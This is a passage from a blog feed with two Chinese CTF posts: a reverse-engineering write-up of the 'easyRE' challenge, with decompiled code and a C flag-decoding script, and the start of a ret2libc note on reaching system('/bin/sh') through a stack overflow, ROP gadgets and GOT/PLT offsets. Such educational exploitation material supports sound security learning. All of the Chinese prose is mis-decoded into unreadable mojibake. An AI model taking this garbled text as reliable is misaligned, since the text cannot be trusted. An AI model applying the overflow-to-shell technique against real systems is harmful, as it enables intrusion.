37LL);</code>è¿™ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°0ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå­—ç¬¦æŒ‡é’ˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸€ä¸ªæ•´å‹å˜é‡ï¼Œå…¶å®ä¹Ÿä¸éš¾åˆ¤æ–­å‡ºæ˜¯<code>read</code>å‡½æ•°ï¼Œè¿™ä¸ªé è‡ªå·±ç§¯ç´¯å¤šäº†ï¼Œçœ‹é“è¿™ç§å½¢å¼å°±çŸ¥é“æ˜¯è¿™ä¸ªå‡½æ•°ã€‚è¿™ä¹ˆè®²æœ‰äº›äººå¯èƒ½æ‡µæ‡µçš„ï¼Œé‚£æˆ‘è¿™ä¹ˆè¯´ï¼Œ<code>sub_4105A6(&quot;%d%d&quot;,&amp;v1,&amp;v2)</code>æ˜¯ä»€ä¹ˆå‡½æ•°ï¼Ÿä½ ä¼šå¾ˆå¿«çœ‹å‡ºè¿™å°±æ˜¯ä¸€ä¸ª<code>scanf</code>ï¼Œé™¤äº†<code>scanf</code>è¿˜æœ‰å“ªä¸ªå‡½æ•°å†™å¾—å‡ºè¿™ç§å½¢å¼å•Šï¼Ÿå–ï¼Œé“ç†ä¸€æ ·çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠé‚£äº›å‡½æ•°é‡å‘½åå›å»çœ‹çœ‹æ•´ä½“è§‚æ„Ÿå¥½äº†ä¸å°‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)<span class="built_in">strlen</span>(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½ ä¼šçªç„¶è‡ªè¨€è‡ªè¯­ï¼Œâ€è¿™ä¸¤ä¸ªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Ÿâ€œï¼Œä¸è¦æ…Œï¼Œå°åœºé¢ï¼Œå°åœºé¢ã€‚é‚£ä¹ˆè¿™ä¹ˆä¹‹åå°±çœ‹çœ‹ä¸»è¦çš„å†…å®¹ï¼Œé¦–å…ˆä¸€ä¸ª<code>for</code>å¾ªç¯æ˜ å…¥çœ¼å¸˜ï¼Œå‘ç°æˆ‘ä»¬è¾“å…¥çš„<code>v15[i]^i</code>å¦‚æœä¸ç­‰äº<code>v12[i]</code>é‚£ä¹ˆå°±ä¼šç›´æ¥è·³åˆ°æœ€åä¸€è¡Œç»“æŸç¨‹åºï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šè¦çœ‹çœ‹ä¸è®©å®ƒè·³è½¬çš„è¾“å…¥è¯­å¥æ˜¯ä¸ªä»€ä¹ˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">char v12[13]; // [rsp+60h] [rbp-C0h] BYREF</span><br><span class="line">char v13[4]; // [rsp+6Dh] [rbp-B3h] BYREF</span><br><span class="line">char v14[19]; // [rsp+71h] [rbp-AFh] BYREF</span><br><span class="line">char v15[32]; // [rsp+90h] [rbp-90h] BYREF</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªäº‹å®ä¸Šæ˜¯æŒ‰ç…§æ ˆçš„é¡ºåºæ’åˆ—çš„ï¼Œä¹Ÿå°±æ˜¯è¯´<code>v12</code>åœ¨é è¿‘æ ˆé¡¶çš„åœ°æ–¹ï¼Œ<code>v15</code>åœ¨é è¿‘æ ˆåº•çš„åœ°æ–¹ã€‚</p><p>é‚£ä¹ˆ<code>v15</code>çœ‹ç€æ²¡æœ‰<code>37</code>çš„å¤§å°ï¼ŒæŠŠå®ƒæº¢å‡ºä¸€ä¸‹ç”¨ç”¨åˆ«äººçš„ä¸å°±å¥½äº†å˜›ï¼Œåˆ«äººåæ­£åœ¨æˆ‘ç”¨çš„æ—¶å€™å®ƒä¹Ÿä¸ç”¨ï¼Œç„¶åé‚£äº›<code>v12,v13,v14</code>éƒ½å¯ä»¥çœ‹æˆé¦–å°¾ç›¸è¿çš„ï¼Œå› ä¸ºå®ƒä»¬çš„æ ˆåœ°å€æœ¬æ¥å°±æŒ¨ç€çš„ã€‚ç„¶åé‚£äº›éƒ½æ˜¯æœ‰èµ‹åˆå€¼çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬è·‘ä¸€ä¸‹çœ‹çœ‹è¿™ä¸²å­—ç¬¦æ˜¯ä»€ä¹ˆã€‚</p><p><img src="https://i.loli.net/2021/05/06/5aroWkuvRVFHA9C.png" alt="buuoj çº¢å¸½æ¯2019 easyRE_2.png"></p><p>å®ƒå‘Šè¯‰ä½ äº†ä¸€ä¸²ä¿¡æ¯ï¼šå‰å››ä¸ªå­—ç¬¦æ˜¯<code>flag</code>ä½ èŠ±äº†è¿™ä¹ˆä¹…æ—¶é—´ç ´è§£å‡ºæ¥çš„ä¸€ä¸²å­—ç¬¦ï¼Œå®ƒè‚¯å®šæœ‰ç”¨ï¼Œå…ˆç•™ç€ï¼Œåé¢åˆ†æè‚¯å®šè¦ç”¨ã€‚</p><p>ç„¶åç¬¬äºŒä¸ªå¼•å…¥çœ¼å¸˜çš„å°±æ˜¯10ä¸ªä¸€æ¨¡ä¸€æ ·çš„å‡½æ•°äº†ï¼Œç‚¹è¿›å»å‘ç°å®ƒå¼•ç”¨äº†base64çš„é‚£å¼ è¡¨ï¼Œè€Œä¸”å¾ˆæ˜æ˜¾çœ‹è§3,4ä¹‹ç±»åœ¨base64åŠ å¯†è§£å¯†å¾ˆå¸¸è§çš„æ•°å­—ï¼Œé‚£ä¹ˆä¸ç”¨ç»†çœ‹äº†ï¼Œè‚¯å®šbase64è§£å¯†ã€‚ç„¶åçœ‹çœ‹å‘ç°è¯»å…¥äº†40ä¸ªå­—ç¬¦ï¼Œç„¶ååé¢è¿˜æœ‰ä¸€ä¸ªå‡½æ•°<code>!(unsigned int)sub_400360(v11, off_6CC090)</code>ç¨å¾®å†ç†Ÿæ‚‰ç‚¹å°±ä¼šå‘ç°è‚¯å®šæ˜¯<code>strcmp</code>å‡½æ•°ï¼Œå¸¸ç”¨æ ¼å¼å˜›<code>if(!strcmp)</code>ï¼Œé‚£ä¹ˆå°±æ˜¯å®ƒè§£å¯†äº†10æ¬¡å˜æˆé•¿åº¦39çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡ŒçœŸçš„ä¸ç”¨è€ƒè™‘è¿™ä¸ªå‡½æ•°æ˜¯åŠ å¯†çš„æƒ…å†µï¼Œæ€»ä¸å¯èƒ½åŠ å¯†äº†ï¼Œè¿™ä¸ªé•¿åº¦æ‰40ï¼Œç®—ä¸€ç®—ä¹Ÿå¾ˆæ¸…æ¥šã€‚é‚£ä¹ˆå¦‚æœæ˜¯è§£å¯†çš„è¯ï¼ŒåŸå­—ç¬¦ä¸²é•¿åº¦å¤§æ¦‚åœ¨710é•¿åº¦å·¦å³ï¼Œå…¬å¼ï¼š<code>40*((4/3)**10)</code>ç®—å¾—çš„ã€‚è¿™ä¹ˆé•¿çš„å­—ç¬¦ä¸²ï¼Œåˆšåˆšé‚£ä¸ªç¬¬ä¸€ä¸ªå°±æ˜¯ï¼Œå¤§æ¦‚é•¿åº¦å°±æ˜¯710ï¼Œå¾ˆç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ï¼Œå†™expå¯¹å®ƒ10æ¬¡base64è§£å¯†å¾—åˆ°ä¸€ä¸ª<a href="https://bbs.pediy.com/thread-254172.htm">ç½‘å€</a>ï¼Œç„¶åä½ å°±å‘ç°è‡ªå·±è¢«éª—äº†ï¼Œé‚£é‡Œæ²¡æœ‰<code>flag</code>ï¼Œç„¶åå°±ä¼šå‘ç°è¿™é‡Œæ²¡ä»€ä¹ˆåœ°æ–¹å¯ä»¥åˆ†æäº†ã€‚</p><p>ç„¶åä½ å¯ä»¥çœ‹åˆ°åˆšåˆšé‚£ä¸€ä¸²å¾ˆé•¿çš„å­—ç¬¦ä¸²ä¸Šé¢è¿˜æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ã€‚</p><p><img src="https://i.loli.net/2021/05/06/TdMyJQIqXgPu1WF.png" alt="buuoj çº¢å¸½æ¯2019 easyRE_3.png"></p><p>ä¸€è·¯è·Ÿè¸ªå®ƒå‘ç°æ¥åˆ°äº†å¦ä¸€ä¸ªå‡½æ•°<code>sub_400D35</code>å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°<code>102</code>,<code>103</code>å®ƒä»¬åˆ†åˆ«æ˜¯<code>f</code>,<code>g</code>çš„asciiç å€¼ï¼Œå¹¶ä¸”åˆšå¥½ä¸‹æ ‡åœ¨0å’Œ3ï¼Œé‚£ä¹ˆå›æƒ³å‰é¢ç»™çš„ä¿¡æ¯ï¼Œç›´æ¥æ–­å®šè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯<code>flag</code>ã€‚</p><p><img src="https://i.loli.net/2021/05/06/ieT7YQB9vgjkn2z.png" alt="buuoj çº¢å¸½æ¯2019 easyRE_4.png"></p><p>ç„¶ååé¢å¯¹è¿™ä¸ªå­—ç¬¦ä¸²åŠ¨æ‰‹åŠ¨è„šçš„ï¼Œé‚£ä¹ˆæ‰¾åˆ°äº†é•¿åº¦ä¸º25çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ ¹æ®å®ƒçš„åŠ å¯†è§„åˆ™ï¼šæ¯å››ä½è½®æ¢<code>v2[4]</code>å¯¹å®ƒå¼‚æˆ–è¿ç®—ã€‚ç”­ç®¡<code>v2</code>æ˜¯å•¥ï¼Œå®ƒå’Œè¿™ä¸ªå­—ç¬¦å¼€å¤´å¼‚æˆ–è‚¯å®šæ˜¯<code>flag</code>è¿™ä¸ªæ˜¯é“çš„é“ç†ï¼Œå› ä¸ºå‰é¢ç ´è§£å‡ºäº†ä¸€ä¸ªæç¤ºã€‚</p><p>é‚£ä¹ˆå’±ä»¬å†™è„šæœ¬è§£ä¸€ä¸‹è¿™ä¸²å­—ç¬¦ã€‚ç›´æ¥å¾—åˆ°<code>flag</code></p><p><img src="https://i.loli.net/2021/05/06/rVxmMbHEOuZATvW.png" alt="buuoj çº¢å¸½æ¯2019 easyRE_5.png"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[]=&#123;<span class="number">0x40</span>,<span class="number">0x35</span>,<span class="number">0x20</span>,<span class="number">0x56</span>,<span class="number">0x5D</span>,<span class="number">0x18</span>,<span class="number">0x22</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x2F</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x3C</span>,<span class="number">0x27</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x6C</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x72</span>,<span class="number">0x3C</span>,<span class="number">0x32</span>,<span class="number">0x45</span>,<span class="number">0x5b</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">string</span> key=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        key[i]^=s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s);i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i]^key[i%<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libcå­¦ä¹ æŠ¥å‘Š</title>
      <link href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>åœ¨åš<code>pwn</code>é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šæƒ³å°½ä¸€åˆ‡åŠæ³•æ‰§è¡Œå‡½æ•°<code>system(&quot;/bin/sh&quot;)</code>ï¼Œé‚£ä¹ˆæ‰§è¡Œè¿™ä¸ªéœ€è¦ä¸¤ç‚¹ï¼š</p><p>1.æ‰¾åˆ°<code>system()</code>å‡½æ•°ã€‚</p><p>2.æ‰¾åˆ°<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²ã€‚</p><span id="more"></span><h2 id="level0-have-everything"><a href="#level0-have-everything" class="headerlink" title="level0:have everything"></a>level0:have everything</h2><p>è¿™ä¸ªæƒ…å†µåœ¨ç®€å•æ¯”èµ›çš„ç­¾åˆ°é¢˜ä¼°è®¡éƒ½å‡ºä¸äº†äº†ï¼Œåœ¨æº¢å‡ºç‚¹å†™ä¸Š<code>system()</code>çš„åœ°å€ï¼Œè‹¥æ˜¯32ä½åˆ™éš”å››å­—èŠ‚å¾€åå¡«å……<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²å°±è¡Œäº†ã€‚å¦‚æœæ˜¯64ä½çš„é‚£ä¹ˆæ‰¾åˆ°<code>pop %rdi ret</code>çš„<code>gadgets</code>åœ¨è¿”å›åœ°å€å¡«ä¸Šï¼Œå¹¶ä¸”åé¢å †ä¸Š<code>&quot;/bin/sh&quot;</code>çš„åœ°å€å’Œ<code>system()</code>çš„åœ°å€å³å¯æˆåŠŸ</p><h2 id="level1-without-â€œbin-shâ€"><a href="#level1-without-â€œbin-shâ€" class="headerlink" title="level1:without â€œbin/shâ€"></a>level1:without â€œbin/shâ€</h2><p>åœ¨ä¸€ä¸ªåœ°æ–¹å†™ä¸Š<code>&quot;bin/sh&quot;</code>ç„¶åæº¢å‡ºçš„æ—¶å€™ä¼ å‚å°±è¡Œäº†ã€‚å¦‚æœæ²¡å¼€å¯<code>ASLR</code>é‚£ä¹ˆå¯ä»¥ç›´æ¥å¾€æ ˆä¸Šå†™ï¼Œå¦‚æœå¼€äº†é‚£ä½ åªèƒ½å¾€<code>.bss</code>æ®µå»å†™ï¼Œå…¶å®å†™å¥½åè·Ÿ<code>level0</code>å·®ä¸å¤š,ä¹Ÿä¸å¤šèµ˜è¿°ã€‚</p><h2 id="level9999-have-nothing"><a href="#level9999-have-nothing" class="headerlink" title="level9999:have nothing"></a>level9999:have nothing</h2><p>å“‡ï¼Œè¿™ä¸ªéš¾åº¦æˆ‘è§‰å¾—çœŸçš„æ˜¯ä¸Šå‡äº†ä¸å°‘æ¡£æ¬¡ï¼Œæ‰€ä»¥ç»™ä¸ª<code>9999</code>çº§æˆ‘è§‰å¾—ä¸è¿‡åˆ†ã€‚</p><p>å•¥éƒ½æ²¡æœ‰çš„æƒ…å†µå°±è¦å¾€<code>libc</code>é‡Œé¢å»æ‰¾<code>system()</code>å‡½æ•°äº†ï¼Œ<code>libc</code>çš„æ‰€æœ‰å‡½æ•°ä¹‹é—´çš„åç§»éƒ½æ˜¯å›ºå®šçš„ï¼Œç¡®å®šäº†ä¸€ä¸ªå‡½æ•°ç›¸å½“äºç¡®å®šäº†<code>libc</code>ä¸­æ‰€æœ‰çš„å‡½æ•°çš„åœ°å€ã€‚ç„¶åå°±æ˜¯å›°æ‰°äº†æˆ‘ä¸€æ•´å¤©çš„ä¸œè¥¿äº†ï¼š<code>plt</code>è¡¨å’Œ<code>got</code>è¡¨ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ä»€ä¹ˆæ„£æ˜¯çœ‹äº†å¾ˆä¹…ï¼Œå› ä¸ºæ„Ÿè§‰æŒ‰ç…§è‡ªå·±çš„é€»è¾‘å®Œå…¨æ²¡å¿…è¦å¼„è¿™ä¹ˆä¸¤å¼ è¡¨çš„ã€‚</p><p>å…ˆçœ‹çœ‹ä¸“ä¸šè§£é‡Šçš„<code>plt</code>å’Œ<code>got</code>ï¼š</p><p><code>plt(procedure linkage table)</code>ç¨‹åºè”åŠ¨è¡¨:</p><p>å½“ç¨‹åºæ‰§è¡Œçš„æ—¶å€™åœ¨è¿™ä¸ªè¡¨é‡Œæ‰§è¡Œæœå¯»ç³»ç»Ÿå‡½æ•°åœ°å€çš„ä»£ç ã€‚é¦–æ¬¡æ‰§è¡Œç³»ç»Ÿå‡½æ•°æ—¶ï¼Œæœå¯»è·å–çœŸå®åœ°å€,å…¶åå†æ‰§è¡Œè¯¥å‡½æ•°æ—¶ç›´æ¥ä»GOTä¸­è·å–çœŸå®åœ°å€ã€‚</p><p><code>got(global offset table):</code>å…¨å±€åç§»è¡¨:</p><p>åœ¨è¿˜æ²¡æœ‰è·å–åˆ°åœ°å€çš„æ—¶å€™ï¼Œé»˜è®¤è¿”å›<code>plt</code>è¡¨è°ƒç”¨<code>dl_runtime_resolve</code>å‡½æ•°å¯»æ‰¾libcå‡½æ•°çš„åœ°å€ã€‚</p><p>å…¶å®æˆ‘åˆ°ç°åœ¨éƒ½è¿˜ä¸æ•¢è‚¯å®šæˆ‘è®²çš„å¯¹ä¸å¯¹ï¼Œä½†æ˜¯æˆ‘ä¹Ÿè¦æ•¢äºè¯´å‡ºæ¥ï¼Œè®©åˆ«äººçœ‹åˆ°ï¼Œå¦‚æœä½ çœ‹åˆ°æˆ‘çš„è§‚ç‚¹è®¤ä¸ºæœ‰å¾ˆå¤§é—®é¢˜çš„ï¼Œæ¬¢è¿ä½ è·Ÿæˆ‘è”ç³»ï¼Œå°†æ„Ÿæ¿€ä¸å°½ã€‚</p><p>ä»¥ä¸‹ä¸ºæˆ‘ç›®å‰è®¤ä¸ºçš„è§‚ç‚¹ï¼š</p><p>ç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™åŠ è½½<code>libc</code>ï¼Œåªæœ‰ä¸€ä¸ªèƒ½ç¡®å®šï¼šé‚£å°±æ˜¯åç§»ï¼Œä½†æ˜¯åŸºå€æ˜¯ä¸ç¡®å®šçš„ï¼Œå› æ­¤æˆ‘ä¹‹å‰çš„ç–‘æƒ‘ï¼šå¦‚æœçŸ¥é“åç§»é‚£ä½•ä¸ç›´æ¥æŠŠåœ°å€å†™åœ¨<code>got</code>è¡¨é‡Œé¢å°±è§£å¼€äº†ã€‚ç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™è¦å»å¯»æ‰¾åŸºå€ï¼Œç„¶åæ‰èƒ½åŠ ä¸Šåç§»å†™åœ¨<code>got</code>è¡¨ä¸­ï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç›´æ¥è°ƒç”¨äº†ã€‚é‚£ä¹ˆå¯èƒ½åˆä¼šæœ‰ç–‘é—®ï¼šä¸ºä»€ä¹ˆæˆ‘æ¯ä¸€æ¬¡è¿è¡Œçš„åœ°å€éƒ½ç¡®å®šçš„ï¼Ÿé‚£æ˜¯å› ä¸ºæˆ‘ä»¬ncçš„è¿œç¨‹æœåŠ¡å™¨å®ƒåªè¿è¡Œäº†è¿™ä¸€ä¸ªç¨‹åºï¼Œä¹Ÿå°±æ˜¯åªæœ‰è¿™ä¸€ä¸ªç¨‹åºè°ƒç”¨äº†<code>libc</code>ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™å½“ç„¶ç¡®å®šçš„ï¼Œå½“ç„¶å‰ææ˜¯è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰å¼€å¯<code>ASLR</code>ã€‚</p><p>ä»¥ä¸Šåªæ˜¯è‡ªå·±åœ¨æœé›†äº†è¿™ä¹ˆå¤šå¸ˆå‚…çš„èµ„æ–™åèƒ½å¾—åˆ°çš„è‡ªå·±è®¤ä¸ºæ­£ç¡®çš„è§‚ç‚¹ï¼ŒçœŸçš„å¾ˆå¤§æ¦‚ç‡é”™çš„ã€‚</p><p>å¦‚æœgotè¡¨æ²¡æœ‰è£…è½½<code>system</code>å‡½æ•°é‚£ä¹ˆæˆ‘ä»¬å°±è¦è‡ªå·±å¯»æ‰¾<code>system</code>å‡½æ•°çš„åœ°å€äº†ã€‚æˆ‘ä»¬å…ˆåˆ—å‡ºä¸€äº›å…¬å¼ï¼Œæˆ‘è®¾<code>libc</code>é‡Œé¢æœ‰ä¸€å‡½æ•°<code>aaa()</code>ï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa=libc_base+aaa_offset</span><br><span class="line">system=libc_base+system_offset</span><br></pre></td></tr></table></figure><p>å› 